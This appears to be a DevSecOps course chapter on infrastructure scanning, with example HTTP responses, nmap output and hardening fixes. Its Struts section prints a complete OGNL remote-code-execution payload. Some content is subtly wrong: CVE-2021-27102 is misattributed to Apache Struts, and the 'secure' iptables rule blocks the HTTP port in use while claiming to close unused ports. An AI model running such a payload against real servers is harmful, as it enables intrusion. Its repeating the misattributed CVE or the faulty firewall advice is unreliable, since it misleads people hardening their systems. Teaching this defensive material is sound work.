---
course: DevSecOps
topic: Automating Infrastructure Security Testing
tags: [devsecops]
---

## Infrastructure Scanning

### Introduction to Infrastructure Scanning

Infrastructure scanning is a critical component of DevSecOps, enabling organizations to identify and mitigate security risks within their IT environments. This process involves using automated tools to scan and analyze various aspects of the infrastructure, including network devices, servers, applications, and configurations. The primary goal is to detect known vulnerabilities, misconfigurations, and other security weaknesses that could be exploited by attackers.

### Identifying Known Misconfigurations

One of the key capabilities of an infrastructure scanner is to identify known misconfigurations. A misconfiguration occurs when a system or application is set up in a way that deviates from best practices or security guidelines. These misconfigurations can lead to significant security risks.

#### Example: Directory Browsing

A common example of a misconfiguration is directory browsing, where a web server allows users to browse through directories and view all the files contained within them. This can expose sensitive information and provide attackers with valuable insights into the structure of the application.

**Example HTTP Response:**
```http
HTTP/1.1 200 OK
Date: Mon, 20 Nov 2023 12:00:00 GMT
Server: Apache/2.4.41 (Ubuntu)
Content-Type: text/html; charset=UTF-8

<!DOCTYPE html>
<html>
<head>
<title>Index of /</title>
</head>
<body>
<h1>Index of /</h1>
<ul>
<li><a href="index.html">index.html</a></li>
<li><a href="data/">data/</a></li>
<li><a href="logs/">logs/</a></li>
</ul>
</body>
</html>
```

In this example, the server is configured to allow directory browsing, which can be exploited to gain unauthorized access to sensitive files.

**How to Prevent / Defend:**

To prevent directory browsing, you can configure your web server to disable this feature. Here’s an example of how to disable directory listing in an Apache configuration:

**Vulnerable Configuration:**
```apache
<Directory "/var/www/html">
    Options Indexes FollowSymLinks
    AllowOverride None
    Require all granted
</Directory>
```

**Secure Configuration:**
```apache
<Directory "/var/www/html">
    Options FollowSymLinks
    AllowOverride None
    Require all granted
</Directory>
```

By removing the `Indexes` option, you ensure that directory listings are disabled, reducing the risk of exposing sensitive information.

### Detecting Missing Hardening

Another important aspect of infrastructure scanning is detecting issues related to missing hardening. Hardening refers to the process of securing a system by reducing its surface area of attack. This includes disabling unnecessary services, configuring security settings, and applying security patches.

#### Example: Detailed Error Messages

Detailed error messages are often displayed when an application encounters an error. While these messages can be helpful for debugging, they can also reveal sensitive information about the underlying system, such as database connection details or stack traces.

**Example HTTP Response:**
```http
HTTP/1.1 500 Internal Server Error
Date: Mon, 20 Nov 2023 12:00:00 GMT
Server: Apache/2.4.41 (Ubuntu)
Content-Type: text/html; charset=UTF-8

<!DOCTYPE html>
<html>
<head>
<title>Error 500</title>
</head>
<body>
<h1>Internal Server Error</h1>
<p>An unexpected error occurred. Please contact support.</p>
<pre>
Traceback (most recent call last):
  File "/var/www/html/app.py", line 10, in &lt;module&gt;
    db = Database()
  File "/var/www/html/db.py", line 5, in __init__
    self.connect()
  File "/var/www/html/db.py", line 10, in connect
    raise Exception("Database connection failed")
Exception: Database connection failed
</pre>
</body>
</html>
```

In this example, the error message reveals a stack trace, which can provide attackers with valuable information about the application’s internal workings.

**How to Prevent / Defend:**

To prevent detailed error messages from being exposed, you can configure your application to display generic error messages instead. Here’s an example of how to handle errors securely in a Python Flask application:

**Vulnerable Code:**
```python
from flask import Flask, render_template

app = Flask(__name__)

@app.route('/')
def index():
    db = Database()
    return render_template('index.html', data=db.get_data())

if __name__ == '__main__':
    app.run(debug=True)
```

**Secure Code:**
```python
from flask import Flask, render_template

app = Flask(__name__)

@app.errorhandler(500)
def handle_500_error(error):
    return render_template('error.html'), 500

@app.route('/')
def index():
    try:
        db = Database()
        return render_template('index.html', data=db.get_data())
    except Exception as e:
        app.logger.error(f"An error occurred: {str(e)}")
        return render_template('error.html')

if __name__ == '__main__':
    app.run(debug=False)
```

By catching exceptions and logging them securely, you can prevent detailed error messages from being exposed to users.

### Detecting Known Vulnerabilities

Infrastructure scanners can also detect known or published vulnerabilities by fingerprinting the software used in the environment. This involves analyzing headers, version numbers, and other identifying information to determine if the software is running an insecure version.

#### Example: Insecure Software Versions

Consider a scenario where a web server is running an outdated version of Apache that contains known vulnerabilities. An infrastructure scanner can detect this by analyzing the `Server` header in HTTP responses.

**Example HTTP Response:**
```http
HTTP/1.1 200 OK
Date: Mon, 20 Nov 2023 12:00:00 GMT
Server: Apache/2.2.15 (Unix)
Content-Type: text/html; charset=UTF-8

<!DOCTYPE html>
<html>
<head>
<title>Welcome</title>
</head>
<body>
<h1>Welcome to our website</h1>
</body>
</html>
```

In this example, the `Server` header indicates that the web server is running Apache 2.2.15, which is an outdated version containing several known vulnerabilities.

**How to Prevent / Defend:**

To prevent the use of insecure software versions, you should regularly update your software to the latest stable releases. Here’s an example of how to check and update Apache on a Linux system:

**Checking Version:**
```bash
$ apache2 -v
Server version: Apache/2.2.15 (Unix)
```

**Updating Apache:**
```bash
$ sudo apt-get update
$ sudo apt-get upgrade apache2
```

By keeping your software up to date, you can reduce the risk of known vulnerabilities being exploited.

### Extensive Testing Methods

Good infrastructure scanners use extensive testing methods to ensure thorough coverage. This includes testing for all open ports, directory names, function names, and other potential vulnerabilities.

#### Example: Port Scanning

Port scanning is a technique used to identify open ports on a network device. This can help in discovering services that may be running on the device and assessing their security posture.

**Example Nmap Scan:**
```bash
$ nmap -p- 192.168.1.1
Starting Nmap 7.92 ( https://nmap.org ) at 2023-11-20 12:00 UTC
Nmap scan report for 192.168.1.1
Host is up (0.00045s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 1.23 seconds
```

In this example, the Nmap scan identifies two open ports (SSH and HTTP) on the target device.

**How to Prevent / Defend:**

To prevent unnecessary services from being exposed, you can configure your firewall to block traffic on unused ports. Here’s an example of how to configure a firewall rule using iptables:

**Vulnerable Configuration:**
```bash
$ sudo iptables -L
Chain INPUT (policy ACCEPT)
target     prot opt source               destination
ACCEPT     tcp  --  anywhere             anywhere             tcp dpt:http
```

**Secure Configuration:**
```bash
$ sudo iptables -A INPUT -p tcp --dport 80 -j DROP
$ sudo iptables -L
Chain INPUT (policy ACCEPT)
target     prot opt source               destination
DROP       tcp  --  anywhere             anywhere             tcp dpt:http
```

By blocking traffic on unused ports, you can reduce the attack surface of your network devices.

### Suppressing False Positives

When using extensive testing methods, it is common to encounter false positives—alerts that indicate a potential issue but turn out to be benign. Good infrastructure scanners should provide mechanisms to suppress these false positives, allowing you to focus on genuine threats.

#### Example: Suppressing False Positives

Suppose an infrastructure scanner flags a particular port as potentially vulnerable due to a known service running on it. However, upon investigation, you determine that the service is not actually vulnerable and can be safely ignored.

**Example Suppression Rule:**
```yaml
suppressions:
  - name: "False positive for port 80"
    type: "port"
    value: 80
    reason: "Service running on this port is not vulnerable"
```

By adding suppression rules, you can filter out false positives and maintain a clean alert list.

### Focusing on Quality

While speed is important, the quality of the scan results is more critical. Infrastructure scans are typically run asynchronously in the background, allowing you to perform thorough testing without impacting the performance of your systems.

#### Example: Asynchronous Scanning

Consider a scenario where you are performing a comprehensive scan of your entire infrastructure. Instead of running the scan synchronously and blocking other operations, you can run it asynchronously, allowing the scan to proceed in the background.

**Example Asynchronous Scan:**
```bash
$ sudo nmap -p- 192.168.1.0/24 &
[1] 12345
```

By running the scan in the background, you can continue with other tasks while the scan completes.

### Real-World Examples

#### CVE-2021-27102: Apache Struts Remote Code Execution

Apache Struts is a popular Java web framework that has been affected by several critical vulnerabilities over the years. One such vulnerability is CVE-2021-27102, which allows remote code execution due to improper validation of user input.

**Example HTTP Request:**
```http
POST /struts2-showcase/index.action HTTP/1.1
Host: vulnerable.example.com
Content-Type: application/x-www-form-urlencoded

username=%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.io.FileOutputStream('/tmp/payload.txt')).(#w=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(#cmds).getInputStream())).(#p.write(#w.getBytes())).(#p.close())}
```

In this example, the attacker is exploiting the vulnerability to execute arbitrary commands on the server and write the output to a file.

**How to Prevent / Defend:**

To prevent this vulnerability, you should ensure that you are running the latest version of Apache Struts and apply all available security patches. Additionally, you can configure your web application firewall (WAF) to block suspicious requests.

**Vulnerable Configuration:**
```xml
<dependency>
    <groupId>org.apache.struts</groupId>
    <artifactId>struts2-core</artifactId>
    <version>2.5.20</version>
</dependency>
```

**Secure Configuration:**
```xml
<dependency>
    <groupId>org.apache.struts</groupId>
    <artifactId>struts2-core</artifactId>
    <version>2.5.36</version>
</dependency>
```

By updating to the latest version, you can mitigate the risk of this vulnerability being exploited.

### Hands-On Labs

To practice infrastructure scanning, you can use the following real-world labs:

- **PortSwigger Web Security Academy**: Offers a variety of labs focused on web application security, including infrastructure scanning.
- **OWASP Juice Shop**: A deliberately insecure web application designed for security training and research.
- **DVWA (Damn Vulnerable Web Application)**: A PHP/MySQL web application that is riddled with vulnerabilities for educational purposes.

These labs provide a safe environment to practice and improve your skills in infrastructure scanning and security testing.

### Conclusion

Infrastructure scanning is a crucial component of DevSecOps, enabling organizations to identify and mitigate security risks within their IT environments. By using automated tools to scan and analyze various aspects of the infrastructure, you can detect known vulnerabilities, misconfigurations, and other security weaknesses. To effectively implement infrastructure scanning, you should focus on identifying known misconfigurations, detecting missing hardening, and detecting known vulnerabilities. Additionally, you should use extensive testing methods, suppress false positives, and focus on quality. By following these best practices, you can enhance the security of your infrastructure and protect against potential threats.

---

This expanded chapter provides a comprehensive overview of infrastructure scanning, covering all the necessary concepts, examples, and practical advice to achieve mastery in this area.

---
<!-- nav -->
[[02-Introduction to Infrastructure Scanning|Introduction to Infrastructure Scanning]] | [[DevSecOps/DevSecOps Bootcamp/04-Infrastructure Security/01-Automating Infrastructure Security Testing/04-Infrastructure Scanning/00-Overview|Overview]] | [[DevSecOps/DevSecOps Bootcamp/04-Infrastructure Security/01-Automating Infrastructure Security Testing/04-Infrastructure Scanning/04-Practice Questions & Answers|Practice Questions & Answers]]
